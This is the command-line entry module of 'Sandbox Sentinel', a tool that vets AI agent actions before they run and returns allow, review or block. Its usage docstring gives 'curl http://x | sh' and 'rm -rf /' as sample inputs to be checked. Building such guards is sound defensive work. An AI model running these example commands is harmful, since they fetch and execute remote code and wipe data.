"""Sandbox Sentinel CLI. Created by LalithPrabu.

    python -m sentinel shell "curl http://x | sh"
    python -m sentinel prompt "my agent wants to run `rm -rf /` - is that ok?"
    python -m sentinel verify logs/audit.jsonl
    echo '{"kind":"shell","target":"ls"}' | python -m sentinel stdin
"""

from __future__ import annotations

import argparse
import json
import sys

from . import __author__, __version__
from .audit import AuditLog
from .engine import ALLOW, BLOCK, REVIEW, Policy, Sentinel, Verdict
from .llm import CLOUD_PRESETS, LLMReviewer, OllamaReviewer, make_provider
from .nl import check_prompt
from .rules import ACTION_KINDS

EXIT = {ALLOW: 0, REVIEW: 1, BLOCK: 2}
PROVIDERS = ("off", "ollama", *CLOUD_PRESETS)


def _verdict_json(v: Verdict) -> dict:
    return {"decision": v.decision, "score": v.score, "llm_risk": v.llm_risk, "llm_reason": v.llm_reason or None,
            "findings": [f.__dict__ for f in v.findings]}


def _read_stdin_actions(raw: str) -> list[dict]:
    """Accept a single JSON object, a JSON array, or JSON Lines."""
    raw = raw.strip()
    if not raw:
        return []
    try:
        data = json.loads(raw)
        return data if isinstance(data, list) else [data]
    except json.JSONDecodeError:
        return [json.loads(line) for line in raw.splitlines() if line.strip()]


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        prog="sentinel",
        description="Vet an AI agent action before it runs.",
        epilog=f"Sandbox Sentinel v{__version__} - created by {__author__}. "
               "Exit codes: 0 allow, 1 review, 2 block, 3 tampered log, 4 bad input.",
    )
    p.add_argument("kind", choices=ACTION_KINDS + ("verify", "stdin", "prompt"),
                   help="action kind; 'prompt' reads a plain-English request; 'verify' checks an audit log; "
                        "'stdin' reads JSON actions from standard input")
    p.add_argument("target", nargs="?", default="", help="command, path, URL, the prompt text, or the audit log path")
    p.add_argument("--payload", default="", help="file body / request body / fetched text")
    p.add_argument("--agent-id", default="agent")
    p.add_argument("--workspace", default=".", help="directory file operations must stay inside")
    p.add_argument("--allow-domain", action="append", default=[], help="repeatable; enables the HTTP allowlist")
    p.add_argument("--audit", default=None, help="append each decision to this hash-chained audit log")
    p.add_argument("--llm", action="store_true", help="ask the local Ollama model for a second opinion")
    p.add_argument("--provider", choices=PROVIDERS, default=None,
                   help="AI provider for --llm/prompt: ollama (default, free/local) or a free cloud tier "
                        f"({', '.join(CLOUD_PRESETS)}). Cloud keys come from env vars.")
    p.add_argument("--model", default=None, help="override the provider's model name")
    p.add_argument("--json", action="store_true", help="machine-readable output")
    p.add_argument("--version", action="version", version=f"sandbox-sentinel {__version__} (created by {__author__})")
    args = p.parse_args(argv)

    if args.kind == "verify":
        res = AuditLog(args.target).verify()
        print(json.dumps(res.__dict__) if args.json else
              (f"OK - {res.entries} entries intact" if res.ok else f"TAMPERED at seq {res.broken_at}: {res.reason}"))
        return 0 if res.ok else 3

    provider = None
    if args.provider and args.provider != "off":
        provider = make_provider(args.provider, args.model)
    elif args.llm:
        provider = make_provider("ollama", args.model)
    reviewer = LLMReviewer(provider) if (provider is not None and args.kind != "prompt") else None
    sentinel = Sentinel(
        Policy(workspace=args.workspace, allowed_domains=tuple(args.allow_domain)),
        audit_log=args.audit,
        reviewer=reviewer,
    )

    if args.kind == "prompt":
        if not args.target:
            p.error("prompt text is required")
        pr = check_prompt(sentinel, args.target, provider=provider)
        if args.json:
            print(json.dumps({"prompt": pr.prompt, "decision": pr.decision, "score": pr.score,
                              "source": pr.interpretation.source, "summary": pr.interpretation.summary,
                              "actions": [{"action": {"kind": a.kind, "target": a.target, "payload": a.payload},
                                           **_verdict_json(v)} for a, v in pr.results],
                              "concerns": [c.__dict__ for c in pr.interpretation.concerns],
                              "notes": pr.interpretation.notes}, indent=2))
        else:
            print(f"{pr.decision.upper()} (score {pr.score}) for prompt via {pr.interpretation.source}")
            if pr.interpretation.summary:
                print(f"  understood as: {pr.interpretation.summary}")
            for a, v in pr.results:
                print(f"  • [{v.decision:6}] {a.kind}: {a.target[:90]}")
                for f in v.findings:
                    print(f"      [{f.severity:8}] {f.rule_id}: {f.description}")
            for c in pr.interpretation.concerns:
                print(f"  ⚠ concern: {c.category} (risk {c.risk}): {c.reason}")
            for n in pr.interpretation.notes:
                print(f"  note: {n}")
        return EXIT[pr.decision]

    if args.kind == "stdin":
        try:
            items = _read_stdin_actions(sys.stdin.read())
            worst = 0
            for item in items:
                v = sentinel.check(item["kind"], item["target"], item.get("payload", ""), item.get("agent_id", "agent"))
                print(json.dumps({"input": item, **_verdict_json(v)}))
                worst = max(worst, EXIT[v.decision])
            return worst
        except (json.JSONDecodeError, KeyError, TypeError, ValueError) as exc:
            print(json.dumps({"error": f"bad input: {exc}",
                              "expected": {"kind": list(ACTION_KINDS), "target": "str", "payload": "str (optional)",
                                           "agent_id": "str (optional)"}}), file=sys.stderr)
            return 4

    if not args.target:
        p.error("target is required for this action kind")
    v = sentinel.check(args.kind, args.target, args.payload, args.agent_id)
    if args.json:
        print(json.dumps(_verdict_json(v), indent=2))
    else:
        print(v.summary())
        for f in v.findings:
            print(f"  [{f.severity:8}] {f.rule_id}: {f.description}  <- {f.evidence}")
        if v.llm_risk is not None:
            print(f"  [llm     ] risk {v.llm_risk}: {v.llm_reason}")
    return EXIT[v.decision]


if __name__ == "__main__":
    sys.exit(main())
